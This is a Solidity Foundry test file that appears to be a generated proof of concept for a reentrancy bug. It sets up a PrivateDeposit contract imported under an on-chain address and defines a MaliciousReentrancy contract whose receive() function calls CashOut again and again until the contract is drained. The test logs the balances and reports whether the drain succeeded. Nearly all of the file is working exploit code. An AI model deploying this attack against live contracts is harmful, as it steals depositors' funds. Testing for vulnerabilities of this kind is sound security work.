// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol";

contract MaliciousReentrancy {
    PrivateDeposit targetContract;
    uint256 attackAmount;
    
    constructor(PrivateDeposit _target) payable {
        require(msg.value >= 1 ether, "Needs at least 1 ether");
        targetContract = _target;
        attackAmount = msg.value;
        targetContract.Deposit{value: attackAmount}();
    }
    
    function startAttack() public {
        targetContract.CashOut(attackAmount);
    }
    
    receive() external payable {
        if (address(targetContract).balance >= attackAmount) {
            targetContract.CashOut(attackAmount);
        }
    }
}

contract DepositTest is Test {
    PrivateDeposit privateDeposit;
    address owner;
    address victim;
    MaliciousReentrancy attacker;

    function setUp() public {
        owner = address(this);
        victim = address(0x123);
        
        privateDeposit = new PrivateDeposit();
        
        vm.deal(victim, 1 ether);
        vm.deal(address(this), 1 ether);
    }

    function test_reentrancyAttack() public {
        // Victim deposits 1 ether
        vm.prank(victim);
        privateDeposit.Deposit{value: 1 ether}();

        // Deploy attacker with 1 ether
        attacker = new MaliciousReentrancy{value: 1 ether}(privateDeposit);

        console.log("--- BEFORE-Trigger ---");
        uint256 preContractBalance = address(privateDeposit).balance;
        uint256 preAttackerBalance = address(attacker).balance;
        uint256 preAttackerDeposit = privateDeposit.balances(address(attacker));

        console.log("PrivateDeposit contract balance (pre):", preContractBalance);
        console.log("Attacker contract balance (pre):", preAttackerBalance);
        console.log("Attacker deposit in PrivateDeposit:", preAttackerDeposit);

        console.log("--- Trigger: startAttack ---");
        // Execute attack
        attacker.startAttack();
        console.log("--- AFTER-Trigger ---");

        uint256 postContractBalance = address(privateDeposit).balance;
        uint256 postAttackerBalance = address(attacker).balance;
        uint256 postAttackerDeposit = privateDeposit.balances(address(attacker));

        console.log("PrivateDeposit contract balance (post):", postContractBalance);
        console.log("Attacker contract balance (post):", postAttackerBalance);
        console.log("Attacker deposit in PrivateDeposit:", postAttackerDeposit);

        // Calculate changes
        uint256 contractLoss = preContractBalance - postContractBalance;
        uint256 attackerGain = postAttackerBalance - preAttackerBalance;
        uint256 depositChange = uint256(int256(postAttackerDeposit) - int256(preAttackerDeposit));

        console.log("Contract ETH loss:", contractLoss);
        console.log("Attacker ETH gain:", attackerGain);
        console.log("Attacker deposit change:", depositChange);

        // Vulnerability validation conditions
        bool contractDrained = (postContractBalance == 0);
        bool attackerHasProfit = (postAttackerBalance == 2 ether);

        // Final verdict logic
        if (contractDrained && attackerHasProfit) {
            console.log("Vulnerability Exists: Reentrancy allowed draining contract and gaining exactly 2 ETH");
        } else {
            console.log("Vulnerability not Exist: Attack failed to drain contract or gain expected ETH");
        }
    }
    
    fallback() external payable {}
}